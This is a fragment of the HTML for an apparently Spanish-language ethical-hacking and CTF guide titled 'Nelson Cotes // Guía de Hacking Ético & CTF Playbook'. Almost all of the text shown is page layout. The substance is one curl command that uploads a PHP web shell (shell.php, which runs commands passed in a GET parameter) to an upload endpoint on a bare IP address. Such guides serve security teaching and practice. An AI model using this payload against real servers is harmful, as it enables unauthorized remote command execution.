...
<head>
  ...
  <title>Nelson Cotes // Guía de Hacking Ético & CTF Playbook</title>
    ...
    <div class="flex items-center gap-3">
      ...
      <div class="flex flex-col">
        <div class="flex items-center gap-2">
          <span class="font-bold text-lg tracking-tight text-surface-text">Nelson Cotes</span>
...
curl -X PUT "http://134.209.63.29:8080/api/subir.php?nombre=shell.php" -H "Cookie: PHPSESSID=..." --data '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
        ...
        <footer class="pt-10 border-t border-surface-border text-center text-xs text-surface-muted space-y-2">
          ...
          <p class="font-mono text-[11px] text-surface-muted pt-1">Guía técnica y bitácora de auditoría · Nelson Cotes</p>
        </footer>
